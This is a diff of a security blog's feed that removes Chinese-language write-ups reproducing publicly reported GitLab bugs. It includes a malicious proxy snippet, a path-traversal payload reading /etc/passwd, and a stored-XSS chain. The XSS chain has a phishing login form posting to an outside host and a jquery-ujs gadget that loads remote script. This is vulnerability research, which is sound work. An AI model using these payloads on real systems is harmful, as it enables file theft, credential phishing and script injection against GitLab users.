-     excluded_headers = ['content-encoding',
-                         'content-length', 'transfer-encoding', 'connection', 'host']
-
-     headers = [(name, value) for (name, value) in request.headers
-             if name.lower() not in excluded_headers]
-
-     host = request.headers["host"]
-     if host.endswith("ngrok.io"):
-         host = "gitlab.com"
-            
-     resp = requests.request(
-         url=f'https://{host}/{path}?{request.query_string.decode()}', method=request.method, headers=dict(headers), data=request.data)
-        
-     headers = [(name, value) for (name, value) in resp.raw.headers.items()
-             if name.lower() not in excluded_headers]
-     response = Response(resp.content, resp.status_code, headers)
-     return response
-
- @app.route('/', defaults={'path': ''}, methods=HTTP_METHODS)
- @app.route('/&lt;path:path&gt;', methods=HTTP_METHODS)
- def proxy(path):
-     # 对流量进行过滤，对于含有漏洞的请求，发送payload
-     if request.method == "GET" and request.query_string == b"relation=uploads":
-         return send_file("uploads.tar.gz", as_attachment=True, mimetype="application/octet-stream")
-     else:
-         # 其他正常请求，发送到gitlab服务器处理
-         return do_proxy(request, path)
-
-</code></pre></div>    </div>
-  </li>
-</ol>]]></content><author><name></name></author><category term="path-traversal" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Reproduction: Gitlab Arbitrary file read via the UploadsRewriter when moving and issue</title><link href="http://localhost:4000/path-traversal/2024/01/10/arbitrary-file-read-via-the-uploadsRewriter.html" rel="alternate" type="text/html" title="Reproduction: Gitlab Arbitrary file read via the UploadsRewriter when moving and issue" /><published>2024-01-10T10:31:06+08:00</published><updated>2024-01-10T10:31:06+08:00</updated><id>http://localhost:4000/path-traversal/2024/01/10/arbitrary-file-read-via-the-uploadsRewriter</id><content type="html" xml:base="http://localhost:4000/path-traversal/2024/01/10/arbitrary-file-read-via-the-uploadsRewriter.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Gitlab Arbitrary file read via the UploadsRewriter when moving and issue</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>path-traversal</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>高危</p>
-</blockquote>
-
-<h2 id="environment">Environment</h2>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GitLab information
-
-Version: 12.8.7-ee
-Revision: 2643fd87200
-Directory: /opt/gitlab/embedded/service/gitlab-rails
-</code></pre></div></div>
-
-<blockquote>
-  <p>原文：<a href="https://hackerone.com/reports/827052">https://hackerone.com/reports/827052</a></p>
-</blockquote>
-
-<p><strong>Gitlab Docker</strong></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run --detach \
-  --hostname 10.206.44.20 \
-  --publish 4433:443 --publish 8033:80 --publish 2233:22 \
-  --name gitlab \
-  --restart always \
-  --shm-size 256m \
-  gitlab/gitlab-ee:12.8.7-ee.0
-</code></pre></div></div>
-
-<p><strong><a href="https://docs.gitlab.com/ee/security/reset_user_password.html#use-a-rails-console">重置root密码失败解决方法</a></strong></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gitlab-rails console
-user = User.find_by_username 'root'
-new_password = "abcd1234"
-user.password = new_password
-user.password_confirmation = new_password
-user.password_automatically_set = false
-user.skip_reconfirmation!
-user.save!
-</code></pre></div></div>
-
-<p><strong>配置debugger</strong></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. 下载ruby2.6.5，推荐用asdf编译，更方便快捷。手动编译：编译：https://www.ruby-lang.org/en/documentation/installation/#building-from-source
-2. 拷贝编译后的include文件夹到/opt/gitlab/embedded/
-3. 添加pry-debug库到Gemfile：/opt/gitlab/embedded/service/gitlab-rails/Gemfile  gem 'pry-byebug', '~&gt; 3.5.1'
-4. 执行bundle install，下载debug库
-5. 其他步骤见环境配置文章
-</code></pre></div></div>
-
-<p><strong>拷贝源码/opt/gitlab/embedded/service/gitlab-rails，vscode查看</strong></p>
-
-<h2 id="url">URL</h2>
-
-<h2 id="summary">Summary</h2>
-
-<h3 id="methods-flow">Methods flow</h3>
-
-<script src="/assets/js/mermaid.min.js"></script>
-<div class="mermaid">
-flowchart
-    classDef red color:#022e1f,fill:#f11111;
-    B[ContentRewriter.execute\napp/services/issuable/clone/content_rewriter.rb]--&gt;A[UploadsRewriter.rewrite\nlib/gitlab/gfm/uploads_rewriter.rb]:::red
-    C[BaseService.execute\napp/services/issuable/clone/base_service.rb]--&gt;B
-    D[MoveService.execute\napp/services/issues/move_service.rb]--&gt;C
-    E[UpdateService.move_issue_to_new_project\napp/services/issues/update_service.rb]--&gt;D
-    F[IssuesController.move\napp/controllers/projects/issues_controller.rb]--&gt;E
-</div>
-
-<p>可以看到issues页面提供move动作如下：</p>
-
-<p><a href="http://10.206.44.20:8033/root/bb/issues/1">http://10.206.44.20:8033/root/bb/issues/1</a></p>
-
-<p><img src="/assets/gitlab/2/issues_move.png" alt="issues_move" /></p>
-
-<p>设置断点验证成功：</p>
-
-<p><img src="/assets/gitlab/2/issues_debug.png" alt="issues_debug" /></p>
-
-<h3 id="data-flow">Data flow</h3>
-
-<script src="/assets/js/mermaid.min.js"></script>
-<div class="mermaid">
-flowchart
-    classDef red color:#022e1f,fill:#f11111;
-    B[ContentRewriter.execute @original_entity\napp/services/issuable/clone/content_rewriter.rb]--&gt;A[UploadsRewriter.rewrite @text \nlib/gitlab/gfm/uploads_rewriter.rb]:::red
-    C[BaseService.execute @original_entity\napp/services/issuable/clone/base_service.rb]--&gt;B
-    D[MoveService.execute issue\napp/services/issues/move_service.rb]--&gt;C
-    E[UpdateService.move_issue_to_new_project issue\napp/services/issues/update_service.rb]--&gt;D
-    F[IssuesController.move issue\napp/controllers/projects/issues_controller.rb]--&gt;E
-</div>
-
-<h3 id="payload">Payload</h3>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[xx](/uploads/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../../../../../../../etc/passwd)
-</code></pre></div></div>
-
-<h3 id="analysis">Analysis</h3>
-
-<ol>
-  <li>首先需要过判断，判断该文件是否存在，判断的逻辑有些复杂，其中路径穿越在判断文件之前存在，用的是CarrierWave.retrieve_from_store!方法
- <em>app/uploaders/object_storage.rb:44</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> def retrieve_from_store!(identifier)
-     paths = upload_paths(identifier)
-
-     unless current_upload_satisfies?(paths, model)
-         # the upload we already have isn't right, find the correct one
-         self.upload = model&amp;.retrieve_upload(identifier, paths)
-     end
-
-     super
- end
-</code></pre></div>    </div>
-    <p>其中super调用<em>/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/carrierwave-1.3.1/lib/carrierwave/storage/file.rb:53</em>，完成相对路径到绝对路径的转换:</p>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> def retrieve!(identifier)
-     path = ::File.expand_path(uploader.store_path(identifier), uploader.root)
-     CarrierWave::SanitizedFile.new(path)
- end
-</code></pre></div>    </div>
-    <p>见expand_path定义：</p>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> File.expand_path(relative_path, base_directory)
- File.expand_path is a Ruby method used to convert a relative file path to an absolute file path. 
- It takes a relative path as an argument and returns the corresponding absolute path.
-</code></pre></div>    </div>
-    <p>类继承关系:</p>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> FileUploader &lt; GitlabUploader &lt; CarrierWave::Uploader::Base
- FileUploader.retrieve_from_store! -&gt; CarrierWave.retrieve_from_store!
-</code></pre></div>    </div>
-    <p>GitlabUploader类对CarrierWave库进行封装，被用到多处文件操作中，查找漏洞需要重点关注该类。
- <em>lib/gitlab/gfm/uploads_rewriter.rb:51</em></p>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> def files
-     referenced_files = @text.scan(@pattern).map do
-         find_file(@source_project, $~[:secret], $~[:file])
-     end
-
-     referenced_files.compact.select(&amp;:exists?)
- end
-</code></pre></div>    </div>
-    <p>使用referenced_files.compact.select(&amp;:exists?)来判断文件是否存在，调用的是referenced_files中元素也就是FileUploader对象的exists方法：
- <em>app/uploaders/object_storage.rb:297</em></p>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> def exists?
-     file.present?
- end
-</code></pre></div>    </div>
-  </li>
-  <li>最后是文件拷贝
- <em>lib/gitlab/gfm/uploads_rewriter.rb:29</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> def rewrite(target_parent)
-     return @text unless needs_rewrite?
-
-     @text.gsub(@pattern) do |markdown|
-         file = find_file(@source_project, $~[:secret], $~[:file])
-         break markdown unless file.try(:exists?)
-
-         klass = target_parent.is_a?(Namespace) ? NamespaceFileUploader : FileUploader
-         moved = klass.copy_to(file, target_parent)
-
-         moved_markdown = moved.markdown_link
-
-         # Prevents rewrite of plain links as embedded
-         if was_embedded?(markdown)
-         moved_markdown
-         else
-         moved_markdown.sub(/\A!/, "")
-         end
-     end
- end
-</code></pre></div>    </div>
-    <p>其中copy_to方法将文件拷贝到目标路径：
- <em>app/uploaders/file_uploader.rb:166</em></p>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> def self.copy_to(uploader, to_project)
-     moved = self.new(to_project)
-     moved.object_store = uploader.object_store
-     moved.filename = uploader.filename
-    
-     moved.copy_file(uploader.file)
-     moved
- end
- def copy_file(file)
-     to_path = if file_storage?
-             File.join(self.class.root, store_path)
-             else
-             store_path
-             end
-
-     self.file = file.copy_to(to_path)
-     record_upload # after_store is not triggered
- end
-</code></pre></div>    </div>
-    <p>最终使用carrierwave库的copy_to进行拷贝：
- <em>/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/carrierwave-1.3.1/lib/carrierwave/sanitized_file.rb</em>
- <em>def copy_to(new_path, permissions=nil, directory_permissions=nil)</em></p>
-  </li>
-  <li>升级为RCE，参考：<a href="https://gist.github.com/stonegao/4051110051622cc5d5cd30721b88f24e">https://gist.github.com/stonegao/4051110051622cc5d5cd30721b88f24e</a></li>
-</ol>
-
-<h2 id="tips">Tips</h2>
-
-<p><strong>路径穿越漏洞</strong></p>
-<ol>
-  <li>上层，需要把每个功能点都考察一遍：
-    <ul>
-      <li>是否有移动行为，该移动行为是否涉及到File.join</li>
-    </ul>
-  </li>
-  <li>底层，定位到功能点对应的代码：
-    <ul>
-      <li>File.join，是否可以控制join的某些变量，导致目录穿越问题。</li>
-      <li>carrierwave的copy_to方法</li>
-      <li>ruby File.expand_path方法相对路径转绝对路径</li>
-    </ul>
-  </li>
-</ol>]]></content><author><name></name></author><category term="path-traversal" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Gitlab debugging: Using gitlab official docker to debug rails backend</title><link href="http://localhost:4000/debug/2023/12/30/using-gitlab-docker-to-debug.html" rel="alternate" type="text/html" title="Gitlab debugging: Using gitlab official docker to debug rails backend" /><published>2023-12-30T10:31:06+08:00</published><updated>2023-12-30T10:31:06+08:00</updated><id>http://localhost:4000/debug/2023/12/30/using-gitlab-docker-to-debug</id><content type="html" xml:base="http://localhost:4000/debug/2023/12/30/using-gitlab-docker-to-debug.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Using gitlab official docker to debug rails backend</p>
-</blockquote>
-
-<h2 id="environment">Environment</h2>
-
-<ol>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">ps aux</code> 查看 gitlab 各种进程</p>
-
-    <p><img src="/assets/gitlab/1/gitlabps.png" alt="gitlabps" /></p>
-  </li>
-  <li>
-    <p>gitlab docker 的安装路径：<code class="language-plaintext highlighter-rouge">/opt/gitlab</code></p>
-  </li>
-  <li>
-    <p>启动脚本：<code class="language-plaintext highlighter-rouge">/opt/gitlab/bin</code></p>
-  </li>
-  <li>
-    <p>gitlab rails 目录：<code class="language-plaintext highlighter-rouge">/opt/gitlab/embedded/service/gitlab-rails</code></p>
-  </li>
-  <li>
-    <p>gitlab rails 启动命令：<code class="language-plaintext highlighter-rouge">/opt/gitlab/bin/gitlab-rails</code>
-<code class="language-plaintext highlighter-rouge">exec /opt/gitlab/embedded/bin/chpst -e /opt/gitlab/etc/gitlab-rails/env ${privilege_drop} -U ${gitlab_user}:${gitlab_group} /opt/gitlab/embedded/bin/bundle exec rails "$@"</code></p>
-  </li>
-  <li>
-    <p>Docker gitlab 查看服务: <code class="language-plaintext highlighter-rouge">gitlab-ctl status</code></p>
-  </li>
-</ol>
-
-<h2 id="steps">Steps</h2>
-
-<ol>
-  <li>
-    <p>停止 <code class="language-plaintext highlighter-rouge">unicorn</code> 服务，该服务负责运行 rails，后续我们手动启动：</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gitlab-ctl stop unicorn
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>端口占用：3000 被 grafana 占用，后续 rails 将启动在 3000 端口，需要将 grafana 停止：</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gitlab-ctl stop grafana
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>手动启动 rails</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /opt/gitlab/bin &amp;&amp; ./gitlab-rails server
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>修改 nginx 配置文件：<code class="language-plaintext highlighter-rouge">/var/opt/gitlab/nginx/conf/gitlab-http.conf</code> 。由于前端是编译好的，因此资源和 js 路径不再由 yarn 提供，而且由 nginx 提供，资源文件的重定向不变，但是位置需要提前。</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location /assets {
- proxy_cache gitlab;
- proxy_pass  http://gitlab-workhorse;
-}
-</code></pre></div>    </div>
-
-    <p>其他所有流量重定向为 puma 开启的本地端口 3000</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location / {
-   proxy_pass http://localhost:3000/;
-   proxy_cache off;
-}
-</code></pre></div>    </div>
-
-    <p>修改后重启 nginx：<code class="language-plaintext highlighter-rouge">gitlab-ctl restart nginx</code></p>
-  </li>
-  <li>
-    <p>添加 ruby 的 include 文件夹，将 ruby 变为开发版本，否则无法安装 gem，gem 需要 native 依赖。编译相同版本的 ruby，将编译后的 include 文件夹拷贝到路径：<code class="language-plaintext highlighter-rouge">/opt/gitlab/embedded/</code></p>
-  </li>
-  <li>
-    <p>进入 rails 目录<code class="language-plaintext highlighter-rouge">/opt/gitlab/embedded/service/gitlab-rails</code>，修改 Gemfile，添加 pry-byebug 库到主环境中，不加的话会报找不到 pry，例如</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gem 'pry-byebug', '~&gt; 3.5.1'
-</code></pre></div>    </div>
-
-    <p>同 development 环境的 version 一致</p>
-  </li>
-  <li>
-    <p>然后在应用 root 目录执行 <code class="language-plaintext highlighter-rouge">bundle install</code>，自动安装 <code class="language-plaintext highlighter-rouge">pry-byebug</code></p>
-  </li>
-  <li>
-    <p>在 break point 处下断点指令 <code class="language-plaintext highlighter-rouge">binding.pry</code></p>
-  </li>
-  <li>
-    <p>启动后端，由 puma 启动，默认端口 3000：</p>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./gitlab-rails server -e development -b 0.0.0.0
-</code></pre></div>    </div>
-    <p>程序运行到断点会在当前终端停下</p>
-  </li>
-</ol>]]></content><author><name></name></author><category term="debug" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Reproduction: Gitlab Cross-site Scripting (XSS) - Stored in RDoc wiki pages</title><link href="http://localhost:4000/xss/2023/12/25/store-xss-in-rdocwiki.html" rel="alternate" type="text/html" title="Reproduction: Gitlab Cross-site Scripting (XSS) - Stored in RDoc wiki pages" /><published>2023-12-25T10:31:06+08:00</published><updated>2023-12-25T10:31:06+08:00</updated><id>http://localhost:4000/xss/2023/12/25/store-xss-in-rdocwiki</id><content type="html" xml:base="http://localhost:4000/xss/2023/12/25/store-xss-in-rdocwiki.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Gitlab Cross-site Scripting (XSS) - Stored in RDoc wiki pages</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>XSS</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>高危</p>
-</blockquote>
-
-<h2 id="environment">Environment</h2>
-
-<blockquote>
-  <p>Ubuntu 18.04
-gitlab 12.3.5</p>
-</blockquote>
-
-<blockquote>
-  <p>原文：<a href="https://hackerone.com/reports/662287">https://hackerone.com/reports/662287</a></p>
-</blockquote>
-
-<h2 id="url">URL</h2>
-
-<h2 id="summary">Summary</h2>
-
-<p>该漏洞存在于用 md 构建 wikipage 这一过程，由于后端没有对 rdoc(和 markdown 很像，ruby 文档生成器)进行严格处理，导致用户能够注入大量 html 代码，这个漏洞太经典了，后续很多漏洞都是以此为基础而利用。</p>
-
-<p><img src="/assets/gitlab/1/rdoc.png" alt="rdoc" /></p>
-
-<p>报告过程</p>
-
-<ol>
-  <li>2019 年 7 月 28 日，首先找到 rdoc 渲染问题，用户能够将 image 嵌入到 a 标签中，并且能够注入 class 属性。</li>
-  <li>注入的 class 属性利用了原应用的类，将 a 标签 z-index 置顶，诱导用户点击。</li>
-  <li>用户甚至能够注入 html 代码，构造钓鱼弹框。但是还没涉及到 xss。（以上是 ruby 后端渲染漏洞）</li>
-  <li>攻击者发现可以注入特定类的 html 代码，拼接前端的 jquery 代码，实现 xss 注入。该处还未实现 csp 绕过。</li>
-  <li>2 个月后，2019 年 10 月 13 日，该漏洞还未修复。并且 gitlab 引用了新的漏洞代码 jquery-ujs，利用 data-method 属性，实现 csp 绕过。（以上是前端漏洞）</li>
-  <li>总结下来，该漏洞分为三部分，第一部分是 html 注入，第二部分是 xss 注入，第三部分是 csp 绕过。</li>
-  <li>因此，复现以最新版本进行，2019 年 10 月 13 日发布的 gitlab12.3.5。</li>
-</ol>
-
-<p>要点：</p>
-
-<ol>
-  <li>class 注入，改变元素外观，从而触发点击</li>
-  <li>a 标签包围 img 标签，img 设置为无限大，触发点击</li>
-  <li>jquery-ujs 的 data-method
-jquery-ujs 提供了一些额外的特性，如将 data-remote 属性应用到链接和表单上，然后使用 AJAX 请求提交数据，或者利用 data-confirm 属性显示确认对话框。</li>
-</ol>
-
-<h3 id="backend-rails">backend, rails</h3>
-
-<p>payload</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a form
-{
-&lt;div class="modal show d-block"&gt;
-&lt;div class="modal-dialog"&gt;
-&lt;div class="modal-content"&gt;
-&lt;div class="modal-header"&gt;
-&lt;h3 class="page-title"&gt;Please Log In&lt;/h3&gt;
-&lt;/div&gt;
-&lt;div class="modal-body"&gt;
-&lt;form class="new-wiki-page" action="http://aw.rs/"&gt;
-&lt;div class="form-group"&gt;
-&lt;label for="username"&gt;&lt;span&gt;Username&lt;/span&gt;&lt;/label&gt;
-&lt;input type="text" name="username" id="username" class="form-control"&gt;
-&lt;label for="password"&gt;&lt;span&gt;Password&lt;/span&gt;&lt;/label&gt;
-&lt;input type="password" name="password" id="password" class="form-control"&gt;
-&lt;/div&gt;
-&lt;div class="form-actions"&gt;&lt;button name="button" type="submit" class="btn btn-success"&gt;Login&lt;/button&gt;&lt;/div&gt;
-&lt;/form&gt;
-&lt;/div&gt;
-&lt;/div&gt;
-&lt;/div&gt;
-&lt;/div&gt;
-}[/]
-</code></pre></div></div>
-
-<p>可以看到能够注入 <code class="language-plaintext highlighter-rouge">div、h3、form、label、input</code> 等标签，以及 <code class="language-plaintext highlighter-rouge">class、action、id、type</code> 等属性。 后端渲染时可以注入部分标签、class 和部分属性，但是 data 属性无法注入，应该是后端做了过滤。因此才会利用前端 gadget 来注入新的包含 <code class="language-plaintext highlighter-rouge">data-*</code>属性的 a 标签，因此该攻击的本质是，首先通过后端注入有限的 html，然后再通过前端 gadget 来注入无限的 html。
-提交该数据的 url 为 post 方法：<em>http://10.206.44.19:8033/root/xss/wikis</em></p>
-
-<h3 id="frontend-jquery-gadgets">frontend, jquery gadgets</h3>
-
-<p>需要点击触发 jquery-ujs 的 data-method 方法，也就是说只要网站支持 jqeury-ujs，并且能够注入 a 标签及其属性，那么 xss 必然出现</p>
-
-<p>payload1:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
-&lt;form class="gl-show-field-errors"&gt;
-&lt;input type="text" title="&amp;#x3C;/p&amp;#x3E;&amp;#x3C;a data-remote=&amp;#x22;true&amp;#x22; data-confirm=&amp;#x22;Are you sure&amp;#x22; data-method=&amp;#x22;get&amp;#x22; data-type=&amp;#x22;script&amp;#x22; href=&amp;#x22;https://gitlab.com/vakzz-h1/public/-/raw/master/test.js&amp;#x22; class=&amp;#x27;atwho-view select2-drop-mask pika-select&amp;#x27;&amp;#x3E;&amp;#x3C;img height=10000 width=10000&amp;#x3E;&amp;#x3C;/a&amp;#x3E;"&gt;
-}[#]
-</code></pre></div></div>
-
-<p>后端渲染结果：</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;form class="xxx"&gt;&lt;input type="" title="xxx"&gt;
-</code></pre></div></div>
-
-<p>前端渲染后：</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;form&gt;&lt;a data-method='get'&gt;&lt;img&gt;&lt;/a&gt;&lt;/form&gt;
-</code></pre></div></div>
-
-<p>经过测试 jquery-ujs 会直接执行 script，如下面代码片段，在最新版本上测试可以 xss：</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-ujs/1.2.3/rails.js"&gt;&lt;/script&gt;
-&lt;a data-remote="true" data-confirm="Are you sure" data-method="get" data-type="script"
-        href="https://gitlab.com/vakzz-h1/public/-/raw/master/test.js"&gt;
-        jquery-ujs xss test
-&lt;/a&gt;
-</code></pre></div></div>
-
-<p>其中 data-type 对应 ajax 的 type 字段，参考</p>
-
-<ul>
-  <li><a href="https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-type">https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-type</a></li>
-  <li><a href="https://api.jquery.com/jQuery.ajax/">https://api.jquery.com/jQuery.ajax/</a></li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dataType (default: Intelligent Guess (xml, json, script, or html))
-"script": Evaluates the response as JavaScript and returns it as plain text. Disables caching by appending a query string parameter, _=[TIMESTAMP], to the URL unless the cache option is set to true. Note: This will turn POSTs into GETs for remote-domain requests. an XML MIME type will yield XML, in 1.4 JSON will yield a JavaScript object, in 1.4 script will execute the script, and anything else will be returned as a string
-</code></pre></div></div>
-
-<p>例如在 chrome-tools control+p 搜索：jquery-ujs 关键字，看目标网站是否有该库</p>
-
-<p><img src="/assets/gitlab/1/ujs.png" alt="ujs" /></p>
-
-<p>payload2:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
-&lt;form class="gl-show-field-errors"&gt;
-&lt;input type="text" title="&lt;script&gt;alert(11)&lt;/script&gt;"&gt;
-}[#]
-</code></pre></div></div>
-
-<p>从下一个复现漏洞中得知利用前端 jquery 片段的漏洞，由于该漏洞需要在页面初始化时才会调用，而本次复现，后端渲染的漏洞代码直接通过路由页面返回。因此 main.js 得以执行触发该漏洞。</p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
+<p><a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90">https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
